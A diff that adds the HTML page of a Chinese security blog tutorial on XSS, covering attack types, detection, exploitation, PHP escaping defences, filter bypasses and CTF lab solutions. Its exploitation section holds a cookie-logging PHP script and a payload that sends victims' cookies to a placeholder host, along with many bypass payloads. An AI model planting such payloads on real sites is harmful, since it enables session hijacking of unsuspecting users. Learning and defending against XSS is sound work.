@@ -1,0 +1,1187 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="XSS, LANVNAL&#39;S Blog">
+    <meta name="description" content="WEB安全、渗透测试、代码审计、20届毕业本科生">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>XSS | LANVNAL&#39;S Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">LANVNAL&#39;S Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/CTF/" class="waves-effect waves-light">
+      
+      <i class="fas fa-flag" style="zoom: 0.6;"></i>
+      
+      <span>CTF</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/websec/" class="waves-effect waves-light">
+      
+      <i class="fab fa-internet-explorer" style="zoom: 0.6;"></i>
+      
+      <span>Web安全</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="waves-effect waves-light">
+      
+      <i class="fas fa-code" style="zoom: 0.6;"></i>
+      
+      <span>代码审计</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="waves-effect waves-light">
+      
+      <i class="fas fa-server" style="zoom: 0.6;"></i>
+      
+      <span>靶机</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/other/" class="waves-effect waves-light">
+      
+      <i class="fas fa-align-left" style="zoom: 0.6;"></i>
+      
+      <span>Others</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-list" style="zoom: 0.6;"></i>
+      
+      <span>网站导航</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/tags">
+          
+          <i class="fas fa-tags" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Tags</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/about">
+          
+          <i class="fas fa-user-circle" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>About</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/friends">
+          
+          <i class="fas fa-address-book" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Friends</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories">
+          
+          <i class="fas fa-bookmark" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Categories</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/archives">
+          
+          <i class="fas fa-archive" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Archives</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">LANVNAL&#39;S Blog</div>
+        <div class="logo-desc">
+            
+            WEB安全、渗透测试、代码审计、20届毕业本科生
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/CTF/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-flag"></i>
+			
+			CTF
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/websec/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fab fa-internet-explorer"></i>
+			
+			Web安全
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-code"></i>
+			
+			代码审计
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/%E9%9D%B6%E6%9C%BA/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-server"></i>
+			
+			靶机
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/other/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-align-left"></i>
+			
+			Others
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-list"></i>
+			
+			网站导航
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/tags " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-tags" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Tags</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/about " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-user-circle" style="position: absolute;left:50px" ></i>
+			      
+		          <span>About</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/friends " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-address-book" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Friends</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-bookmark" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Categories</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/archives " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-archive" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Archives</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/coverimgs/4.png')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">XSS</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/websec/">
+                                <span class="chip bg-color">websec</span>
+                            </a>
+                        
+                            <a href="/tags/note/">
+                                <span class="chip bg-color">note</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2017-03-11
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2020-02-16
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.7k
+                </div>
+                
+
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="0X01-什么是XSS？"><a href="#0X01-什么是XSS？" class="headerlink" title="0X01 什么是XSS？"></a>0X01 什么是XSS？</h2><p>​    本名是CSS（Cross Site Scripting)，即跨站脚本攻击。为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。关键在于在网页中嵌入脚本代码。</p>
+<h2 id="0X02-XSS原理"><a href="#0X02-XSS原理" class="headerlink" title="0X02 XSS原理"></a>0X02 XSS原理</h2><p>​    XSS攻击通过在网页中嵌入客户端恶意脚本代码来实现盗取Cookie、改变网页内容、URL调转等目的。一般是通过JavaScript语言编写的JS脚本代码，因为JS是广泛使用的网络脚本语言主要用来向HTML页面添加交互行为，可以直接嵌入HTML页面。JS代码可以直接被浏览器解析这样就可以通过在页面嵌入或跨站执行JS代码达到攻击的目的。实际攻击中，往往通过<code>&lt;script src=&quot;http://xxxxxx&quot;&gt;&lt;/script&gt;</code>来加载外部脚本，这样就可以在外部准备好实现目的的脚本，这样不会被原网页的一些条件限制，只要一个链接就可以加载外部脚本实现攻击。</p>
+<h2 id="0X03-XSS类型"><a href="#0X03-XSS类型" class="headerlink" title="0X03 XSS类型"></a>0X03 XSS类型</h2><p>​    主要分为三类：反射型、储存型、DOM型。</p>
+<h3 id="1-反射型"><a href="#1-反射型" class="headerlink" title="1. 反射型"></a>1. 反射型</h3><p>​    也称为非持久性XSS，过程是用户访问一个带有XSS的URL请求时（需要用户访问进行触发），服务器端接收数据后处理，然后把带有XSS代码的数据发回浏览器，浏览器解析这带有XSS代码的数据，造成XSS漏洞。因为过程像反射所以有了这个名字。</p>
+<p>​    一个例子：</p>
+<pre><code>&lt;?php
+    $username = $_GET[&#39;username&#39;];
+    echo $username;
+?&gt;    </code></pre>
+<p>​    这段代码的作用就是接受username值并输出，这里就存在反射型XSS，如果在这里输入<code>&lt;script&gt;XSS恶意代码&lt;/script&gt;</code>,就会造成反射型XSS漏洞。</p>
+<h3 id="2-存储型"><a href="#2-存储型" class="headerlink" title="2.存储型"></a>2.存储型</h3><p>​    也称为持久型XSS，因为会将数据存储在服务器端，这样的话会造成持久性的危害。相对于反射型XSS,这种漏洞更为”持久”,因为用户输入不仅仅被输出在了html中,而且还储存到了数据库中,这样每次访问这个页面时就会形成一次XSS，导致访问某个页面的用户会长期遭到攻击。它和另外两个的区别在于反射型和DOM型需要用户手动触发，而储存型不需要。常见出现的地方是留言板,微博,bbs等，有的网站个人资料设置也有这个问题存在。</p>
+<p>​    输入的值会被插入到HTML中储存，所以要确定好输入点和输出点，输出的地方是在标签内还是标签属性内还是其他地方，如果在属性内，代码是不会执行的。所以想法闭合标签使输出不在属性中。比如下面这个，输出点在Value属性内，就要构造闭合标签。</p>
+<pre><code>&lt;inpute type=&quot;text&quot; name=&quot;content&quot; value=&quot;内容&quot;/&gt;
+构造代码闭合标签： &quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+得到的效果：&lt;inpute type=&quot;text&quot; name=&quot;content&quot; value=&quot;&quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;/&gt;</code></pre>
+<p>可以看到这样闭合后xss语句就在标签属性外了。</p>
+<h3 id="3-DOM型"><a href="#3-DOM型" class="headerlink" title="3.DOM型"></a>3.DOM型</h3><p>​    DOM：即文档对象模型（Document Object Model），DOM实际上是以面向对象方式描述的文档模型。DOM定义了表示和修改文档所需的对象、这些对象的行为和属性以及这些对象之间的关系。可以把DOM认为是页面上数据和结构的一个树形表示，不过页面当然可能并不是以这种树的方式具体实现。通过 JavaScript，您可以重构整个 HTML 文档。您可以添加、移除、改变或重排页面上的项目。使用DOM可以允许程序和脚本动态的访问和更新文档内容、结构和样式。DOM为文档提供了结构化表示，并定义了如何通过脚本来访问文档。根据DOM规定，HTML文档的每个成员是一个节点。HTML的标签都是一个个节点，而这些节点组成了DOM的整体结构：节点树。其实打开Chrome的开发者工具element模块可以看到网页的DOM结构。</p>
+<p>​    下面是一段经典的DOM型XSS示例</p>
+<pre><code>&lt;script&gt;
+    var temp = document.URL ;   //获取URL
+    var index = document.URL.indexOf(&quot;content=&quot;)+4;
+    var par = temp.substring(index);
+    document.write(decodeURL(par));   //输入获取内容
+&lt;/script&gt;    </code></pre>
+<p>上诉代码的意思是获取URL中content参数的值，并且输出，如果输入<code>http://xxxx.html?content=&lt;script&gt;alert(//xss)&lt;/script&gt;</code>,就会产生XSS漏洞。</p>
+<blockquote>
+<p>Flash XSS</p>
+<p>Flash XSS也叫XSF（Cross Site Flash）,准确的说XSF应该算是XSS的分支，因为在XSS使用到的技巧，在XSF中只有一部分可以使用，而且XSF是基于ActionScript语言的。</p>
+<p>不常用到：一篇文章–&gt;<a href="https://www.secpulse.com/archives/44299.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/44299.html</a></p>
+</blockquote>
+<h3 id="0X04-XSS漏洞的挖掘"><a href="#0X04-XSS漏洞的挖掘" class="headerlink" title="0X04 XSS漏洞的挖掘"></a>0X04 XSS漏洞的挖掘</h3><p>​    检测XSS时，选择有特殊意义的字符，可有快速检测是否存在XSS。例如<code>&lt;,&gt;,&quot;,&#39;,()</code>等，提交后查看源代码看看这些输入是否被转义。在测试时输入可以加上一些明显的标记便于寻找如AAAAA。在没办法看源码时不知道输出位子可以输入<code>&quot;/&gt;XSStest</code>来测试。也可以用工具来扫描XSS漏洞。</p>
+<p>​    一般通过插入xss代码后页面的弹窗或浏览器脚本错误来判断是否存在xss漏洞。对于xss，找到输入输出位置很重要，有时候输出位置就在输入页面，有时候有提示，有时候什么都不知道，所以找好输出位置很重要。</p>
+<h4 id="1-反射型XSS的挖掘"><a href="#1-反射型XSS的挖掘" class="headerlink" title="1.反射型XSS的挖掘"></a>1.反射型XSS的挖掘</h4><p>基本分4种情况：HTML标签之间，HTML标签之内，JavaScript代码的值，CSS代码的值。</p>
+<ul>
+<li><p>HTML标签之间</p>
+<p>最常出现的场景是<code>&lt;div&gt;&lt;/div&gt;</code>之间，这样我们提交的XSS代码是可以直接触发的。例如<code>&lt;div&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;/div&gt;</code>,如果是<code>&lt;title&gt;&lt;/title&gt;</code>这样的标签中，插入的JS代码直接作为文本输出了，并没有执行，要先闭合标签，例如这个payload<code>&lt;/textarea&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;textarea&gt;</code>。</p>
+</li>
+<li><p>HTML标签之内</p>
+<p>最普通的场景是出现在<code>&lt;input value=“[输出]”/&gt;</code>位置上,对于这种情况，•跟之前一样，闭合标签，提交的payload：<code>”&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;input value=“</code>,•另外一种就是闭合属性，然后利用一些事件来触发XSS，提交的payload：<code>”onmouseover=alert(1) x=“</code>,后面的一个例题就用到了这个。•如果输出在src/href/action等属性内，例如<code>&lt;a href=“[输出]”&gt;&lt;/a&gt;</code>,我们除了可以闭合标签外，还可以用<code>javascript:alert(1)//</code>,<code>data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=</code></p>
+</li>
+<li><p>JavaScript代码的值</p>
+<p>有些javascript代码是服务端输出的，有时候会将用户输入的值一起输出，例如<code>&lt;script&gt;a=“[输出]”；&lt;/script&gt;</code>,可以像上面那样闭合标签，也可以闭合变量值<code>”;alert(1);//</code>,也可以利用<code>&lt;script&gt;</code>标签的闭合机制，它会优先寻找最近的一个<code>&lt;/script&gt;</code>闭合.payload:<code>&lt;/script&gt;&lt;script&gt;alert(1)//</code></p>
+</li>
+<li><p>CSS代码的值</p>
+<p>出现在<code>body&#123;color:[输出];&#125;</code>的位置上,只存在于IE了，payload：<code>1;xss:expression(if(!window.x)&#123;alert(1);window.x=1;&#125;)</code></p>
+</li>
+</ul>
+<h4 id="2-储存型XSS的挖掘"><a href="#2-储存型XSS的挖掘" class="headerlink" title="2.储存型XSS的挖掘"></a>2.储存型XSS的挖掘</h4><blockquote>
+<p>根据上面对“反射型XSS挖掘”的学习，其实存储型XSS挖掘也就差不多了，只不过这里一般是表单的提交，然后进入服务端存储中，最终会在某个页面上输出，输出的位置有以下几种情况：</p>
+<p>•表单提交后跳转到的页面有可能就是输出点</p>
+<p>•表单所在的页面也有可能是输出点</p>
+<p>•表单提交后不见了，具体的页面不清楚，得一个一个页面的去找</p>
+</blockquote>
+<h3 id="0X05-XSS利用"><a href="#0X05-XSS利用" class="headerlink" title="0X05 XSS利用"></a>0X05 XSS利用</h3><pre><code>#### 1.盗取Cookie</code></pre>
+<p>​    把获取文件放在自己搭的网站服务器下。代码如下，stealcookies.php</p>
+<pre><code>&lt;?php
+$ua = $_SERVER[&quot;HTTP_USER_AGENT&quot;];
+$client_ip = $_SERVER[&quot;REMOTE_ADDR&quot;];
+$method = $_SERVER[&quot;REQUEST_METHOD&quot;];
+$referer = $_SERVER[&quot;HTTP_REFERER&quot;];
+$date = date(&quot;F j, Y, g:i a&quot;);
+$querystring = $_SERVER[&quot;QUERY_STRING&quot;];
+$log = fopen(&quot;cookie.txt&quot;,&quot;a+&quot;);
+$str= &quot;IP: $client_ip |Useragent: $ua | Method: $method | REF: $referer | Date: $date  | Cookie: $querystring \n&quot;;
+fwrite($log,$str);
+?&gt;</code></pre>
+<p>​    构造XSS语句</p>
+<pre><code>&lt;script&gt;document.write(&#39;&lt;img src=&quot;http://xxxxxx/stealcookies.php?a=&#39; + encodeURI(document.cookie) + &#39;&quot;/&gt;&#39;)&lt;/script&gt;</code></pre>
+<p>​    把上面的语句放到XSS的目标中，最好是存储型xss，比如某个博客或者论坛什么的存在存储型XSS，在里面发一篇帖子或者留上评论，内容就是上述语句，当其他用户或者管理员打开这个评论或者帖子链接后，就会触发，然后跳转到http ://xxxxxx/cookie.asp?msg=’+document.cookie的页面，然后当前账户的cookie信息就当成参数发到网站下的文件里了。然后的然后就可以那这个cookie登陆了。。。。。。</p>
+<h4 id="2-XSS-Framework"><a href="#2-XSS-Framework" class="headerlink" title="2.XSS Framework"></a>2.XSS Framework</h4><p>​    XSS漏洞利用框架，就是XSS利用的代码组合，但是进行了整合并且还有图形化的界面，使用起来十分方便。网上有源码，自己搭一个就能用。</p>
+<h4 id="3-XSS-GetShell"><a href="#3-XSS-GetShell" class="headerlink" title="3.XSS GetShell"></a>3.XSS GetShell</h4><p>​    需要特定的场景下才能实现。DedeCMSV57_GBK_SP1版本就可以实现，书中的例子就是这个环境。因为title变量没进行过滤，在XSS语句通过$title传到了数据库。</p>
+<h2 id="0X06-防范"><a href="#0X06-防范" class="headerlink" title="0X06 防范"></a>0X06 防范</h2><p>​    知道如何防范XSS也有利于进行XSS攻击，所谓知己知彼百战不殆。</p>
+<p>​    防范的关键就是不让XSS语句能够执行。所以一般对输入的内容进行过滤以破坏XSS正常语句。</p>
+<p>​    在PHP中提供了htmlspecialchars()、htmlentities()函数可以把一些预定义的字符转换为HTML实体。</p>
+<p>预定义字符如下：</p>
+<table>
+<thead>
+<tr>
+<th align="center">字符</th>
+<th align="center">HTML实体</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">&amp;</td>
+<td align="center">&amp;amp</td>
+</tr>
+<tr>
+<td align="center">“</td>
+<td align="center">&amp;quot</td>
+</tr>
+<tr>
+<td align="center">‘</td>
+<td align="center">&amp;#039</td>
+</tr>
+<tr>
+<td align="center">&lt;</td>
+<td align="center">&amp;lt</td>
+</tr>
+<tr>
+<td align="center">&gt;</td>
+<td align="center">&amp;gt</td>
+</tr>
+</tbody></table>
+<p>​    经过转义后构造的代码已经起不到作用了。</p>
+<p>​    JSOUP：其过滤方式采取白名单方式。whitelist清理器能够在服务器端对用户输入的HTML进行过滤，只输出一些安全的标签和属性。而其配置可以根据自己所需修改。</p>
+<p>​    OWASP Esapi：提供一系列的编码操作，通过编码，破环输入的XSS代码。</p>
+<p>​    HttpOnly：httponly标注的cookie值无法被JavaScript获取。往往passwd都标注了httponly。</p>
+<h2 id="0X07-绕过"><a href="#0X07-绕过" class="headerlink" title="0X07 绕过"></a>0X07 绕过</h2><ol>
+<li>  过滤会改变代码 ，所以我们不能直接这么写代码。但我们可以尝试改变 javascript的写法，使它依旧可以被浏览器执行但又不匹配正则表达式。例如 URL 编码：<code>&lt;a   href=&quot;java&amp;#115;cript:alert (&#39;xss&#39;)&quot;&gt;link&lt;/a&gt;</code>上面这段代码不匹配正则表达式，但是浏览器依旧会执行它，因为浏览器会首先进行 URL 解码操作。</li>
+<li>  利用空格。许多过滤匹配特殊的标签，包括起始与结束尖括号。但是，许多浏览器接受结束括号前的空白符，允许攻击者轻易避开这种过滤。例如：<code>&lt;script &gt;</code></li>
+<li>  因为许多人用小写字符编写HTML代码，所以一些过滤仅检查常用的小写恶意标签。例如：<code>&lt;ScRiPt&gt;</code>，通过改变字符大小写避开过滤。</li>
+<li>  一些过滤匹配任何成对的起始与结束尖括号，删除其中的任何内容，但通常可以依靠周围现有的语法，结束注入的标签，从而避开这种过滤。例如：可以控制下面代码中的value属性值：<code>&lt;input type=&quot;hidden&quot; name=&quot;pageid&quot; value=&quot;foo&quot;&gt;</code>就可以使用以下不会被过滤阻止的脚本，注入一个包含JavaScript的新标签：<code>foo&quot;&gt;&lt;x styple=&quot; x:expression(alert(document.cookie))</code>许多情况下，浏览器接受未结束的HTML标签；攻击者可以利用这种行为避开过滤。通过构造类似下面无效的HTML代码：<code>&lt;img src=&quot;&quot; onerror=alert&#123;document.cookie&#125;</code></li>
+<li>  一些过滤匹配成对的起始与结束尖括号，提取其中的内容，并将这些内容与标签名称黑名单进行比较。可以通过使用多余的括号避开过滤。<code>&lt;&lt;script&gt;alert(document.cookie);//&lt;&lt;/script&gt;</code></li>
+<li>  即使空字节后面的文本仍然在应用程序的响应中返回，但如果遇到空字节，一些过滤会停止处理字符串。在被过滤的表达式前插入一个URL编码的空字节即可避开这种过滤。<code>foo%00&lt;script&gt;</code></li>
+<li>  如果用户提交的数据在应用过滤后还进行了规范化，仍可以通过URL编码或双重编码被过滤的表达式，避开过滤，并对漏洞进行利用。</li>
+<li>  在gbk或gbXXX编码中可以通过宽字节绕过<code>%bf\、%df、%81</code></li>
+<li>  CRLF注入绕过，利用<code>\r\n</code>在HTTP响应头注入回车换行符，并注入X-XSS-Protection: 0，可以防止脚本运行被阻止。</li>
+<li>  IE同域白名单–Referer来源为本域则XSS Filter不生效</li>
+<li>  Chorme同域白名单–标签嵌入的是同域内的js文件，XSS Filter就不会防御</li>
+<li>  编码(url编码等)</li>
+<li>  代码混淆(例如：jsfk)</li>
+</ol>
+<blockquote>
+<blockquote>
+<p>检测流程</p>
+<p>1.输入任意数据，寻找输出点</p>
+<p>2.输入&lt; &gt; \ “ ‘ / 等字符，查看过滤情况</p>
+<p>3.分析输出所在的环境（以html还是js解析）</p>
+<p>4.构造payload</p>
+<p>5.盲打</p>
+<p>常用语句</p>
+<p>•<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>   弹出提示框</p>
+<p>•<code>&lt;img src=“javascript:alert(1)”&gt;</code>         弹出提示框</p>
+<p>•<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>     弹出用户COOKIES</p>
+<p>•<code>&lt;iframe src=http://www.baidu.com&gt;&lt;/iframe&gt;</code>  在当前页插入另一站点</p>
+</blockquote>
+<p>•<a href="http://www.freebuf.com/sectool/4799.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/4799.html</a>     （beef + msf）</p>
+<p>•<a href="http://www.freebuf.com/articles/web/24372.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/24372.html</a>  （xssf + msf）</p>
+</blockquote>
+<h2 id="0X08-题目"><a href="#0X08-题目" class="headerlink" title="0X08 题目"></a>0X08 题目</h2><p>1-<a href="http://lab1.xseclab.com/realxss1_f123c17dd9c363334670101779193998/index.php" target="_blank" rel="noopener">—&gt;链接&lt;—</a>这是一个XSS基础题</p>
+<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170313/175900242.PNG" alt="mark"></p>
+<p>在输入框中输入<code>&lt;script&gt;alert(1)&lt;/script&gt;  </code>，弹窗有提示：</p>
+<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170313/180128794.png" alt="mark"></p>
+<p>把1换掉就出flag了。。</p>
+<p>2-<a href="http://lab1.xseclab.com/realxss2_bcedaba7e8618cdfb51178765060fc7d/index.php" target="_blank" rel="noopener">—&gt;链接&lt;—</a></p>
+<p>​    输入第一题的payload，出现这个，xss被检测出来了。</p>
+<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170313/234247518.png" alt="mark"></p>
+<p>​    就不能这样写了，要想办法绕过。</p>
+<p>​    输入<code>&lt;img src=# onerror=alert(&quot;success!&quot;) /&gt;</code>，过，得flag。</p>
+<p>​    原因如下：用的img标签，src并没有给出图片路径。当图片没有找到路径（即src=“路径“找不到图片）就会弹出消息框,这个就是onerror=alert(xxxx)起的作用。</p>
+<p>3<a href="http://192.168.139.231/web20/xss/index.php" target="_blank" rel="noopener">—&gt;链接&lt;—</a></p>
+<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170315/193427419.png" alt="mark"></p>
+<p>有提示，要弹出cookie，还没有过滤，直接输入<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>就OK了。</p>
+<p>4.</p>
+<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170316/193146060.png" alt="mark"></p>
+<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170316/170834852.png" alt="mark"></p>
+<p>​    onmouseenter事件 —当鼠标指针移动到图像时执行 JavaScript</p>
+<p>​    将onmouseenter添加到输入框的标签中，当鼠标点击时执行js代码。</p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">LANVNAL</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://lanvnal.com/2017/03/11/xss/">https://lanvnal.com/2017/03/11/xss/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
